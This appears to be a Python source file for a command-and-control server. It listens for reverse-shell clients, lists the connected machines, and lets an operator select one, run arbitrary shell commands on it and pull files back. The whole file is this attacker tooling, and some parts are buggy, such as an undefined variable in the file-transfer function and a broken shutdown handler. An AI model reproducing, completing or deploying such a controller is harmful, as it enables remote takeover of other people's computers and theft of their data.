import socket
import threading
import time
import sys
from queue import Queue
import struct
import signal
import socketserver

#Github: wilson-ben
#Email: bjwilson@protonmail.com

#creds to thenewboston for multiple connection code.

def transfer(conn, command):
    conn.send(command.encode()) # send command to connection
    f = open('/root/Desktop'+path,'wb')
    while True:
        bits = conn.recv(1024)
        if bits.endswith("DONE".encode()):
            f.write(bits[:-4]) # write out bits and remove DONE
            f.close()
            print("[+]Transfer Completed")
            break
        if "File not found".encode() in bits:
            print("[-]Unable to find the file")
            break
        f.write(bits)

THREAD_COUNT = 2
JOB_NUMBER = [1, 2]

queue = Queue()

COMMANDS = {
    'help':['Show this Screen'],
    'list':['List the Current Connected Clients'],
    'select':['Selects a client by its index. Takes index as a parameter'],
    'quit':['Stops current connection with a client. To be used when client is selected'],
    'accept':['Begin accepting more connections'],
    'exit':['Shuts server down'],


}


class MyTCPServer(object):


    def __init__(self):
        #make sure this works later bud
        self.host = input("Host: ")
        self.port = int(input("Port: "))

        self.s = None
        self.connections = []
        self.addresses = []

    def print_menu(self):
        for cmd, v in COMMANDS.items():
            print("{0}:\t{1}".format(cmd, v[0]))
        return
    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self):
        print("attempting to quit the proper way.... MISSION ABORTED... Pyruvius stole the heart ")

        for conn in self.connections:
            try:
                conn.shutdown(2)
                conn.close()
            except Exception as e:
                print("damn just failed at failing to succeed and close %s" % str(e))

            self.s.close()
            sys.exit(0)


    def start_server(self):
        self.s = socket.socket()
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        print("Socket Started...")

    def server_bind(self):

        try:

            self.s.bind((self.host, self.port))
            self.s.listen(5)
        except:
            print("Binding Error.... try new port or host.....")
            time.sleep(5)
            self.server_bind()

        return


    def accept_clients(self):
        for c in self.connections:
            c.close()

        self.connections = []
        self.addresses = []
        while True:
            try:

                conn, addr = self.s.accept()
                conn.setblocking(1)
                client_hostname = conn.recv(1024).decode("utf-8")
                address = addr + (client_hostname,)
                self.connections.append(conn)
                self.addresses.append(address)
                ip, port = str(addr[0]), str(addr[1])
                print("Connection Established With {0} : {1}".format(ip, port))
            except Exception as e:
                print("Trouble accepting a connection: %s" % str(e))

            return

    def start_reynard(self):
        #interactive prompt being created here
        # go here when making the GUI
        time.sleep(5)
        while True:
            command = input('Server> ')
            if command == 'list':
                self.list_connections()
                continue
            elif 'select' in command:
                target, conn = self.get_target(command)
                if conn is not None:
                    self.send_target_commands(target, conn)
            elif command == "exit":
                queue.task_done()
                queue.task_done()
                print('Server Shutting down...')
                self.quit_gracefully()
            elif command == 'help':

                self.print_menu()
            elif command == 'accept':
                self.accept_clients()
            elif command == '':
                pass
            else:
                print('Command not found')
        return

    def list_connections(self):
        results = ''
        for i, conn in enumerate(self.connections):
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)
            except:
                del self.connections[i]
                del self.addresses[i]
                continue
            results += str(i) + '   ' + str(self.addresses[i][0]) + '   ' + str(self.addresses[i][1]) + '   ' + str(self.addresses[i][2]) + '\n'
        print('------Clients Connected-----' + '\n' + results)
        return

    def get_target(self, command):
        target = command.split(' ')[-1]
        try:
            target = int(target)
        except:
            print('Client index should be a number, try that again')
            return None, None
        try:
            conn = self.connections[target]
        except IndexError:
            print("Not a Valid Target")
            return None, None
        print("Connectionn now established with " + str(self.addresses[target][2]))
        return target,conn

    def read_command_output(self, conn):
        raw_msglen = self.recvall(conn, 4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        # Read the message data
        return self.recvall(conn, msglen)
    def recvall(self, conn, n):
        """ Helper function to recv n bytes or return None if EOF is hit
                :param n:
                :param conn:
                """
        # TODO: this can be a static method
        data = b''
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    def send_target_commands(self, target, conn):

        conn.send(str.encode(" "))
        cwd_bytes = self.read_command_output(conn)
        cwd = str(cwd_bytes, "utf-8")
        print(cwd, end="")
        while True:
            try:
                cmd = input()
                if len(str.encode(cmd)) > 0:
                    if str(cmd) == "back":
                        break
                    conn.send(str.encode(cmd))
                    cmd_output = self.read_command_output(conn)
                    client_response = str(cmd_output, "utf-8")
                    print(client_response, end="")
                if cmd == 'quit':
                    print("leaving")
                    break
            except Exception as e:
                print("Connection was lost %s" % str(e))
                break
        del self.connections[target]
        del self.addresses[target]
        return

def create_workers():
    server = MyTCPServer()
    server.register_signal_handler()
    for _ in range(THREAD_COUNT):
        t = threading.Thread(target=work, args=(server,))
        t.daemon = True
        t.start()
    return

def work(server):
    while True:
        x = queue.get()
        if x == 1:
            server.start_server()
            server.server_bind()
            server.accept_clients()
        if x == 2:
            server.start_reynard()

        queue.task_done()
    return

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

    return

def main():
    create_workers()
    create_jobs()

if __name__ == '__main__':
    main()

